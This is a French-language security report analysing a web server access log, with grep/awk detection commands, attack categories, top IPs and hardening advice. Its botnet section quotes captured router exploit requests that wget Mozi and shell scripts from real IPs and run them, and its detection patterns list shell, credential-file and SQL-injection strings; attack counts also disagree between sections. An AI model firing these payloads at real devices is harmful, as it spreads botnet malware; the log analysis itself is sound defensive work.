# Rapport d'analyse du fichier calt.logs

## 1. Informations generales

| Metrique | Valeur |
|---|---|
| Taille du fichier | 305 Mo |
| Nombre total de lignes | 2 384 117 |
| Format | Apache/Nginx Combined Log Format |
| Periode couverte | 03/May/2021 au 06/Jan/2026 |
| Nombre d'IPs uniques | 18 117 |

### Commande utilisee pour identifier le format

```bash
# Lire les premieres lignes pour identifier le format
head -5 calt.logs
```

**Resultat** : Le format est le Combined Log Format Apache/Nginx :
```
IP - - [date] "METHOD /path HTTP/x.x" status_code size "referer" "user-agent"
```

### Commandes de statistiques generales

```bash
# Nombre total de lignes
wc -l calt.logs

# Plage de dates
head -1 calt.logs | awk -F'[][]' '{print $2}'
tail -1 calt.logs | awk -F'[][]' '{print $2}'

# Nombre d'IPs uniques
awk '{print $1}' calt.logs | sort -u | wc -l
```

---

## 2. Distribution du trafic

### Codes HTTP

| Code | Nombre | Signification |
|---|---|---|
| 200 | 2 193 468 | OK (92%) |
| 404 | 87 551 | Not Found |
| 301 | 57 575 | Redirection |
| 302 | 24 595 | Redirection temporaire |
| 403 | 5 428 | Forbidden |
| 500 | 1 607 | Erreur serveur |
| 400 | ~2 700 | Bad Request |

```bash
# Distribution des codes HTTP
awk '{print $9}' calt.logs | sort | uniq -c | sort -rn | head -10
```

### Methodes HTTP

| Methode | Nombre |
|---|---|
| GET | 2 317 430 |
| POST | 61 598 |
| HEAD | 2 176 |
| Binaires (\x16\x03...) | ~581 |
| PRI | 87 |
| CONNECT | 21 |

```bash
# Distribution des methodes HTTP
awk -F'"' '{print $2}' calt.logs | awk '{print $1}' | sort | uniq -c | sort -rn | head -10
```

### Volumetrie mensuelle

Le trafic est tres concentre sur decembre 2025 et janvier 2026 :
- Janvier 2026 : 2 086 764 requetes (87.5%)
- Decembre 2025 : 295 957 requetes (12.4%)
- Le reste represente < 1% du trafic

```bash
# Requetes par mois
awk -F'[][]' '{print $2}' calt.logs | awk -F: '{print $1}' | awk -F/ '{print $2"/"$3}' | sort | uniq -c | sort -rn
```

---

## 3. Identification des applications hebergees

L'analyse des URLs les plus demandees revele :

| Application | Preuve | Requetes |
|---|---|---|
| API REST (Magento?) | `/en/api/rest/V1/sequence` | 1 883 846 |
| WordPress | `/wp-admin/`, `/wp-login.php`, `/xmlrpc.php` | ~165 000 |
| Agora | `/agora/index.php` | 4 388 |

```bash
# Top URLs
awk -F'"' '{print $2}' calt.logs | awk '{print $2}' | sort | uniq -c | sort -rn | head -20
```

Plusieurs sites WordPress sont identifies via les redirections :
- ledenicheurautopro.com
- competition.slat.asso.fr / slat.asso.fr
- intranet.larouatiere.com
- pandamotion-location-visite.fr

---

## 4. Attaques identifiees

### 4.1. Scan phpMyAdmin (brute-force de chemins)

**781 requetes detectees**

Un attaquant (principalement `51.75.27.232`) tente de trouver une installation phpMyAdmin en testant des dizaines de chemins courants :

```bash
# Detection
grep -ci 'phpmyadmin\|pma\|phpmy' calt.logs
# Voir les details
grep -i 'phpmyadmin\|pma' calt.logs | head -20
```

**Exemples** :
```
/phpMyAdmin/index.php
/phpmyadmin2021/index.php
/pma2021/index.php
/administrator/phpMyAdmin/index.php
/db/db-admin/index.php
/mysql/sqlmanager/index.php
```

**Type** : Reconnaissance / Enumeration de services
**Gravite** : Moyenne (toutes les tentatives ont recu un 404)

---

### 4.2. Injection de commandes / Botnet Mozi

**~250 requetes detectees**

Des bots tentent d'exploiter des vulnerabilites de routeurs (Netgear, GPON) pour deployer le malware **Mozi** :

```bash
# Detection
grep -ci 'cmd=\|exec(\|system(\|passthru\|shell_exec\|/bin/sh\|/bin/bash\|wget\|curl.*http\|setup\.cgi' calt.logs
# Exemples
grep -i 'setup\.cgi.*cmd\|/shell?cd\|login\.cgi.*wget' calt.logs | head -10
```

**Exemples d'exploits** :

1. **Netgear RCE + Mozi** :
```
GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://45.229.55.61:52820/Mozi.m+-O+/tmp/netgear;sh+netgear
```
- Exploite une faille RCE dans les routeurs Netgear
- Telecharge et execute le malware Mozi

2. **Hakai Botnet** :
```
GET /login.cgi?cli=aa%20aa';wget%20http://195.133.40.213/icy.sh%20-O%20->%20/tmp/kh;sh%20/tmp/kh'$
User-Agent: Hakai/2.0
```
- Exploite des routeurs via login.cgi
- Telecharge un script shell malveillant

3. **Jaws Webserver RCE** :
```
GET /shell?cd+/tmp;rm+-rf+*;wget+65.21.189.187/jaws;sh+/tmp/jaws
```

**Type** : Exploitation active / Deploiement de malware
**Gravite** : Critique

---

### 4.3. Exploitation GPON Router (CVE-2018-10561)

**Nombreuses requetes POST sur `/GponForm/diag_Form`**

```bash
# Detection
grep -ci 'GponForm' calt.logs
# Details
grep -i 'GponForm' calt.logs | head -5
```

**Exemple** :
```
POST /GponForm/diag_Form?style/ HTTP/1.1  User-Agent: "Hello, World"
```

**Type** : Exploitation de vulnerabilite connue (CVE-2018-10561/10562)
**Gravite** : Critique

---

### 4.4. Brute-force WordPress / wp-login

**~165 000 requetes liees a WordPress**

```bash
# Detection
grep -ci 'wp-admin\|wp-login\|wp-content\|wp-includes\|wordpress\|xmlrpc' calt.logs
# Analyse des tentatives wp-login
grep 'wp-login' calt.logs | awk '{print $1}' | sort | uniq -c | sort -rn | head -10
```

Les endpoints vises :
- `/wp-login.php` : tentatives de connexion brute-force
- `/xmlrpc.php` : exploitation de l'API XML-RPC (amplification, brute-force)
- `//xmlrpc.php` : double slash pour contourner les protections

**Type** : Brute-force / Exploitation XML-RPC
**Gravite** : Haute

---

### 4.5. Scan de panneaux d'administration

**~8 939 requetes**

```bash
# Detection
grep -ci '/admin\|/manager\|/login\|/jenkins\|/console\|/dashboard' calt.logs
# Top des chemins admin testes
grep -i '/admin\|/manager/html\|/jenkins\|/console' calt.logs | awk -F'"' '{print $2}' | awk '{print $2}' | sort | uniq -c | sort -rn | head -15
```

Chemins testes :
- `/manager/html` (Tomcat Manager)
- `/jenkins/login`
- `/login`
- `/admin`
- `/console`
- `/dashboard`

**Type** : Reconnaissance / Enumeration
**Gravite** : Moyenne

---

### 4.6. Acces aux fichiers sensibles (.env, config, git)

```bash
# Detection
grep -ci '\.env\|wp-config\|passwd\|shadow\|\.git\|\.htaccess\|credentials\|config\.php' calt.logs
# Details
grep -i '\.env\|wp-config\|\.git/\|\.htaccess' calt.logs | head -10
```

Fichiers cibles :
- `/.env` : variables d'environnement (mots de passe DB, cles API)
- `/wp-config.php` : configuration WordPress
- `/.git/` : depot git expose
- `/.htaccess` : configuration Apache

**Type** : Fuite d'informations sensibles
**Gravite** : Haute

---

### 4.7. SQL Injection

**~786 requetes suspectes**

```bash
# Detection
grep -ci "union.*select\|select.*from\|drop.*table\|insert.*into\|or%201=1\|'%20or%20\|1=1\|information_schema" calt.logs
# Exemples
grep -i "union.*select\|1=1\|information_schema" calt.logs | head -5
```

**Type** : Injection SQL
**Gravite** : Critique

---

### 4.8. Path Traversal (Directory Traversal)

**26 requetes**

```bash
# Detection
grep -ci '\.\./\|\.\.\\' calt.logs
# Details
grep -i '\.\.\/' calt.logs | head -10
```

Tentatives de remonter l'arborescence avec `../` pour acceder a des fichiers systeme.

**Type** : Path Traversal
**Gravite** : Haute

---

### 4.9. Probes TLS/SSL et requetes binaires

**~888 requetes contenant des sequences hexadecimales**

```bash
# Detection
grep -c '\\x' calt.logs
# Exemples
grep '\\x16\\x03' calt.logs | head -5
```

Les sequences `\x16\x03\x01` correspondent a des ClientHello TLS envoyes sur le port HTTP (port 80). Cela indique des scanners qui testent si le serveur supporte HTTPS.

**Type** : Reconnaissance
**Gravite** : Faible

---

### 4.10. Scanners automatises et bots

**412 requetes avec des user-agents de scanners connus**

```bash
# Detection
grep -ci 'zgrab\|nmap\|nikto\|masscan\|censys\|shodan\|sqlmap\|dirbuster\|gobuster\|nuclei' calt.logs
# Details par scanner
grep -i 'zgrab\|censys\|shodan\|nuclei' calt.logs | awk -F'"' '{print $6}' | sort | uniq -c | sort -rn
```

Scanners identifies :
- **zgrab** : scanner de ports et services
- **CensysInspect** : moteur de recherche d'appareils
- **Hakai/2.0** : botnet
- **libwww-perl** : scripts Perl automatises (souvent malveillants)
- **Go-http-client** : souvent des outils de scan Go

---

### 4.11. User-agents suspects / bots non malveillants

```bash
# Top user-agents
awk -F'"' '{print $6}' calt.logs | sort | uniq -c | sort -rn | head -20
```

Bots non malveillants mais a surveiller :
- **GPTBot/1.3** (OpenAI) : 80 788 requetes - crawling pour entrainement IA
- **PetalBot** (Huawei) : 8 006 requetes
- **GoogleStackdriverMonitoring** : 9 325 requetes (monitoring uptime)
- **Uptime-Kuma** : 7 664 requetes (monitoring)

---

## 5. Top 10 des IPs les plus actives

```bash
awk '{print $1}' calt.logs | sort | uniq -c | sort -rn | head -10
```

| IP | Requetes | Observation |
|---|---|---|
| 74.7.242.37 | 72 443 | Trafic le plus important |
| 212.129.30.127 | 41 102 | |
| 212.83.157.174 | 28 073 | |
| 141.98.11.189 | 15 683 | Connu comme IP malveillante |
| 212.129.7.181 | 15 649 | |
| 88.178.51.200 | 15 628 | |
| 80.124.97.83 | 12 603 | |
| 176.163.185.63 | 10 113 | |
| 89.3.13.18 | 9 975 | |
| 185.252.128.95 | 9 644 | Range 185.252.128.x suspect |

---

## 6. Resume des attaques

| # | Type d'attaque | Nb requetes | Gravite | CVE associes |
|---|---|---|---|---|
| 1 | Brute-force WordPress / XML-RPC | ~62 000 + 28 779 | Haute | - |
| 2 | Acces fichiers sensibles (.env, config, .git) | ~4 000 | Haute | - |
| 3 | SQL Injection | ~327 | Critique | - |
| 4 | phpMyAdmin scanning | 163 | Moyenne | - |
| 5 | Botnet Mozi / Injection de commandes | ~79 | Critique | CVE-2017-17215, CVE-2014-8361 |
| 6 | Exploit GPON Router | 19 | Critique | CVE-2018-10561/10562 |
| 7 | Scan panneaux admin | ~8 939 | Moyenne | - |
| 8 | Path traversal | 26 | Haute | - |
| 9 | Probes TLS/SSL | ~888 | Faible | - |
| 10 | Scanners automatises (zgrab, censys, sqlmap) | ~412 | Faible/Info | - |

---

## 7. Recommandations

1. **Bloquer les IPs malveillantes recurrentes** via fail2ban ou un WAF
2. **Desactiver xmlrpc.php** si non necessaire (souvent exploite)
3. **Proteger /wp-admin et /wp-login.php** avec une authentification supplementaire ou un limiteur de taux
4. **S'assurer que `.env`, `.git/`, `wp-config.php`** ne sont pas accessibles publiquement
5. **Mettre a jour** tous les CMS, plugins et firmwares
6. **Deployer un WAF** (ModSecurity, Cloudflare) pour filtrer les injections SQL et commandes
7. **Bloquer les user-agents de scanners** connus si non necessaires
8. **Monitorer GPTBot** et decider si le crawling IA est souhaite (bloquer via robots.txt)
